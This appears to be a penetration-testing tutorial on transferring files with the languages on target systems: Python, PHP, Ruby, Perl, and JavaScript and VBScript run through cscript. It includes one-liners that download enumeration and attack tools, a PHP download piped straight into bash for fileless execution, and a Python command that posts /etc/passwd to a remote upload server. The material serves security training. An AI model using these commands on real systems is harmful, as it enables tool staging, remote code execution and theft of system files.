## Transferring Files with Code

It is very common to find one or more programming languages installed on target systems. Languages such as **Python, PHP, Perl, and Ruby** are widely available on Linux distributions and are sometimes present on Windows systems as well. These languages can be abused to download, upload, or even execute files when traditional tools are blocked.

On Windows, built-in utilities such as **cscript** and **mshta** allow execution of JavaScript or VBScript. JavaScript can also be used on Linux systems. With hundreds of programming languages available, almost any language capable of networking can be leveraged for file transfer operations.

This section focuses on practical examples using commonly encountered languages.

---

## Python

Python is one of the most frequently encountered languages during engagements. Both Python 2.7 and Python 3 may be present on older or misconfigured systems. Python supports running one-liners directly from the command line using the `-c` option.

### Python 2 – Download a File

```bash
python2.7 -c 'import urllib; urllib.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

### Python 3 – Download a File

```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

---

## PHP

PHP is extremely prevalent in web environments and provides multiple methods for transferring files. PHP one-liners can be executed using the `-r` option.

### PHP Download Using `file_get_contents()`

This method downloads the remote file and writes it locally.

```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh", $file);'
```

### PHP Download Using `fopen()`

This approach manually reads the remote file in chunks and writes it to disk.

```bash
php -r 'const BUFFER = 1024;
$fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb");
$flocal = fopen("LinEnum.sh", "wb");
while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); }
fclose($flocal); fclose($fremote);'
```

### PHP Fileless Execution (Pipe to Bash)

Downloaded content can also be executed directly in memory.

```bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh");
foreach ($lines as $line) { echo $line; }' | bash
```

> **Note:**
> Using URLs as filenames with `@file()` requires `allow_url_fopen` to be enabled.

---

## Other Languages

### Ruby – Download a File

```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

### Perl – Download a File

```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

Ruby and Perl both support one-liners using the `-e` flag, making them useful alternatives when Python or PHP is unavailable.

---

## JavaScript (Windows)

JavaScript can be executed on Windows using `cscript.exe`. The following example uses ActiveX objects to download a file.

### JavaScript Downloader (`wget.js`)

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();

var BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

### Execute with `cscript.exe`

```bat
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

---

## VBScript (Windows)

VBScript is installed by default on most Windows systems and can also be used for file transfers.

### VBScript Downloader (`wget.vbs`)

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")

xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

### Execute with `cscript.exe`

```bat
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

---

## Upload Operations Using Python 3

For uploads, HTTP POST requests are commonly used. The Python `requests` module makes this straightforward.

### Start a Python Upload Server

```bash
python3 -m uploadserver
```

### Upload a File with a Python One-liner

```bash
python3 -c 'import requests; requests.post("http://192.168.49.128:8000/upload", files={"files": open("/etc/passwd", "rb")})'
```

### Python Upload Explained

```python
import requests

url = "http://192.168.49.128:8000/upload"
file = open("/etc/passwd", "rb")

r = requests.post(url, files={"files": file})
```

---

## Section Recap

Using programming languages for file transfers is a powerful technique when traditional tools are restricted or monitored. Understanding how to leverage common languages to download, upload, or execute files can be critical during penetration tests, red team engagements, CTFs, incident response, forensic investigations, and even routine system administration tasks.
